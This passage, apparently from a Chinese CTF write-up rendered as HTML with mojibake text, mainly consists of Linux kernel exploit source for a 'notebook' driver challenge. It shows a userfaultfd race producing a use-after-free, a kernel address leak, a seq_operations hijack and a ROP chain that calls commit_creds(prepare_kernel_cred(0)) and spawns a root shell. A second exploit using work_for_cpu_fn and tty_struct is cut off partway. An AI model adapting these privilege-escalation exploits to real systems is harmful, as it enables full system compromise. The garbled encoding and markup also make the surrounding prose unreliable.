class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x100</span>, addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">add_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *ret_buf = <span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">int</span> fd[<span class="number">0x100</span>];</span><br><span class="line">    <span class="keyword">uint64_t</span> leak_addr;</span><br><span class="line">    <span class="keyword">int</span> index;</span><br><span class="line">    g_fd = open(<span class="string">&quot;/dev/notebook&quot;</span>,<span class="number">2</span>);</span><br><span class="line">    signal(SIGSEGV,getshell);</span><br><span class="line"><span class="comment">// 1. notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    <span class="keyword">char</span>* name = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(name, <span class="string">&#x27;a&#x27;</span>, <span class="number">18</span>);</span><br><span class="line">    noteadd(<span class="number">0</span>,<span class="number">0x20</span>,name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. using userfaultfd to produce UAF: notebook[0].note = heap1 / notebook[0].size = 0x100</span></span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    RegisterUserfault(addr, userfaultfd_leak_handler);</span><br><span class="line">    <span class="keyword">pthread_t</span> thr_edit,thr_add;</span><br><span class="line">    pthread_create(&amp;thr_edit, <span class="literal">NULL</span>, edit_thread, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. set notebook size to enable read/write : notebook[0].note = heap1 / notebook[0].size = 0x20</span></span><br><span class="line">    pthread_create(&amp;thr_add, <span class="literal">NULL</span>, add_thread, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// sleep(1);   //ç»™1sç¼“å†²æ—¶é—´ï¼Œè®©sizeå€¼å†™ä¸Š</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 4. get heap1 back, then we can use the UAF</span></span><br><span class="line">    <span class="keyword">for</span>(i =<span class="number">0</span> ;i&lt;<span class="number">100</span>; i++)&#123;</span><br><span class="line">        fd[i] = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);              <span class="comment">// in kernel it will kmalloc(0x20)</span></span><br><span class="line">        read_note(ret_buf, <span class="number">0</span>);                          <span class="comment">// check whether we hit heap1 or not</span></span><br><span class="line">        leak_addr = *(<span class="keyword">int64_t</span> *)ret_buf;</span><br><span class="line">        <span class="keyword">if</span>(((leak_addr&amp;<span class="number">0xffffffff00000000</span>) &gt;&gt; <span class="number">32</span>) == <span class="number">0xFFFFFFFF</span>)&#123;</span><br><span class="line">            index = i;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;found it! the index is %d\n&quot;</span>,index);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">100</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to get heap1 back, let&#x27;s try again!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5. leak kernel base: read heap1</span></span><br><span class="line">    kernel_base = leak_addr - (single_start_func - bzImage_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base : 0x%lx\n&quot;</span>,kernel_base);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6. hijack control flow: write heap1, then trigger &#x27;seq_operations-&gt;start&#x27;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> control_rip = add_rsp_1a8 - bzImage_base + kernel_base;</span><br><span class="line">    write_note((<span class="keyword">char</span>*)&amp;control_rip,<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 7. stack pivot: use the gift func ^_^</span></span><br><span class="line">    save_status();</span><br><span class="line">    noteadd(<span class="number">1</span>,<span class="number">0x60</span>,name);</span><br><span class="line">    noteedit(<span class="number">1</span>,<span class="number">0x200</span>,name);</span><br><span class="line">    notegift(ret_buf);</span><br><span class="line">    heap_addr = *(<span class="keyword">int64_t</span> *)(ret_buf+<span class="number">0x10</span>);                 <span class="comment">// heap addr</span></span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> gadget_buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gadget_buf[a++] = pop_rdi_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;                                     </span><br><span class="line">    gadget_buf[a++] = pkc_addr - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = pop_rsi_pop_rdx_pop_ret - bzImage_base + kernel_base;     <span class="comment">// mov rdi, rax</span></span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = pop_rbp_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = mov_rdi_rax_pop_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;</span><br><span class="line">    gadget_buf[a++] = cc_addr - bzImage_base + kernel_base;;</span><br><span class="line">    gadget_buf[a++] = swapgs_pop_ret - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = <span class="number">0x0</span>;           </span><br><span class="line">    gadget_buf[a++] = iretq - bzImage_base + kernel_base;</span><br><span class="line">    gadget_buf[a++] = (<span class="keyword">uint64_t</span>)getshell;</span><br><span class="line">    gadget_buf[a++] = user_cs;</span><br><span class="line">    gadget_buf[a++] = user_rflags;</span><br><span class="line">    gadget_buf[a++] = user_sp;</span><br><span class="line">    gadget_buf[a++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write_note(gadget_buf,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 8. trigger</span></span><br><span class="line">    temp_fd = fd[index];</span><br><span class="line">    pop_rsp_ret = pop_rsp_ret - bzImage_base + kernel_base;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span>     <span class="comment">// r15</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// r14 /tmp/x</span></span><br><span class="line">        <span class="string">&quot;mov r13, 0x13131313;&quot;</span>      <span class="comment">// r13</span></span><br><span class="line">        <span class="string">&quot;mov r12, 0x12121212;&quot;</span>      <span class="comment">// r12</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, pop_rsp_ret;&quot;</span>      <span class="comment">// bbbbbbbb</span></span><br><span class="line">        <span class="string">&quot;mov rbx, heap_addr;&quot;</span>      <span class="comment">// aaaaaaaa</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x22222222;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, 0x33333333;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, temp_fd;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>



        <h3 id="exp4"   >
          <a href="#exp4" class="heading-link"><i class="fas fa-link"></i></a><a href="#exp4" class="headerlink" title="exp4"></a>exp4</h3>
      <blockquote>
<p>åˆ©ç”¨work_for_cpu_fn()å‡½æ•°ï¼ŒåŠ«æŒtty_struct-&gt;ops-&gt;ioctlï¼Œåˆ†ä¸¤æ¬¡æ‰§è¡Œcommit_cred(prepare_kernel_creds(0))ï¼Œæœ€ååœ¨ç”¨æˆ·æ€æ‰§è¡Œsystem(â€œ/bin/shâ€)è·å¾—root shell</p>
</blockquote>
<p>æ³¨æ„ç‚¹ï¼š</p>
<ol>
<li><p>åªèƒ½ç”¨ioctlï¼Œä¸èƒ½ç”¨write</p>
</li>
<li><p>å†™tty_structå’Œfile_operationsè¦å…ˆå°†å†…å®¹è¯»å‡ºï¼Œæ”¹æ‰ç›®æ ‡ä½ç½®åï¼Œå†å°†å†…å®¹å…¨éƒ¨å†™å›ã€‚</p>
</li>
</ol>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> g_fd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span>* addr;</span><br><span class="line"><span class="keyword">uint64_t</span> temp_buf[<span class="number">0x20</span>];</span><br><span class="line"><span class="keyword">int</span> temp_fd;</span><br><span class="line"><span class="keyword">uint64_t</span> heap_addr;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PAGE_SIZE sysconf(_SC_PAGE_SIZE)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> bzImage_base = <span class="number">0xFFFFFFFF81000000</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_base;</span><br><span class="line"><span class="keyword">uint64_t</span> work_for_cpu_fn = <span class="number">0xFFFFFFFF8109EB90</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> ptm_ops = <span class="number">0xFFFFFFFF81E8E440</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> cc_addr = <span class="number">0xFFFFFFFF810A9B40</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> pkc_addr = <span class="number">0xFFFFFFFF810A9EF0</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">note</span>&#123;</span></span><br><span class="line">	<span class="keyword">uint64_t</span> note;</span><br><span class="line">	<span class="keyword">uint64_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">userarg</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> idx;</span><br><span class="line">    <span class="keyword">uint64_t</span> size;</span><br><span class="line">    <span class="keyword">char</span>* buf;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ErrExit</span><span class="params">(<span class="keyword">char</span>* err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">userfaultfd_leak_handler</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> uffd = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) arg;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">    <span class="keyword">int</span> nready;</span><br><span class="line">    </span><br><span class="line">    pollfd.fd = uffd;</span><br><span class="line">    pollfd.events = POLLIN;</span><br><span class="line">    nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    sleep(<span class="number">30</span>);</span><br><span class="line">    <span class="comment">// pause();</span></span><br><span class="line">    <span class="keyword">if</span> (nready != <span class="number">1</span>) ErrExit(<span class="string">&quot;[-] Wrong poll return val&quot;</span>);</span><br><span class="line"></span><br><span class="line">    nready = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line">    <span class="keyword">if</span> (nready &lt;= <span class="number">0</span>) ErrExit(<span class="string">&quot;[-] msg err&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* page = (<span class="keyword">char</span>*) mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (page == MAP_FAILED) ErrExit(<span class="string">&quot;[-] mmap err&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="number">0</span>, <span class="keyword">sizeof</span>(page));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uc</span>;</span></span><br><span class="line">    uc.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">    uc.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp; ~(PAGE_SIZE - <span class="number">1</span>);</span><br><span class="line">    uc.len = PAGE_SIZE;</span><br><span class="line">    uc.mode = <span class="number">0</span>;</span><br><span class="line">    uc.copy = <span class="number">0</span>;</span><br><span class="line">    ioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] leak handler done&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">RegisterUserfault</span><span class="params">(<span class="keyword">void</span> *fault_page,<span class="keyword">void</span> *handler)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">ua</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">ur</span>;</span></span><br><span class="line">    <span class="keyword">uint64_t</span> uffd  = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    ua.api = UFFD_API;</span><br><span class="line">    ua.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;ua) == <span class="number">-1</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ur.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)fault_page;     <span class="comment">//æˆ‘ä»¬è¦ç›‘è§†çš„åŒºåŸŸ</span></span><br><span class="line">    ur.range.len   = PAGE_SIZE;</span><br><span class="line">    ur.mode        = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class="number">-1</span>)    <span class="comment">//æ³¨å†Œç¼ºé¡µé”™è¯¯å¤„ç†</span></span><br><span class="line">        ErrExit(<span class="string">&quot;[-] ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> s = pthread_create(&amp;thr, <span class="literal">NULL</span>,handler, (<span class="keyword">void</span>*)uffd);</span><br><span class="line">    <span class="keyword">if</span> (s!=<span class="number">0</span>)</span><br><span class="line">        ErrExit(<span class="string">&quot;[-] pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteadd</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x100</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notedel</span><span class="params">(<span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br><span class="line">    ioctl(g_fd, <span class="number">0x200</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">noteedit</span><span class="params">(<span class="keyword">uint64_t</span> idx, <span class="keyword">uint64_t</span> size, <span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .size = size,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x300</span>, &amp;arg);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">notegift</span><span class="params">(<span class="keyword">char</span>* buf)</span></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">userarg</span> <span class="title">arg</span> =</span> &#123;</span><br><span class="line">        .idx = <span class="number">0</span>,</span><br><span class="line">        .size = <span class="number">0</span>,</span><br><span class="line">        .buf = buf,</span><br><span class="line">    &#125;;   </span><br><span class="line"></span><br><span class="line">    ioctl(g_fd, <span class="number">0x64</span>, &amp;arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">write_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    write(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_note</span><span class="params">(<span class="keyword">char</span>* con_buf, <span class="keyword">uint64_t</span> idx)</span></span>&#123;</span><br><span class="line">    read(g_fd,con_buf,idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">edit_thread</span><span class="params">()</span></span>&#123;</span><br><span class="line">    noteedit(<span class="number">0</span>, <span class="number">0x500</span>, addr);</span><br><span class="line">    <span 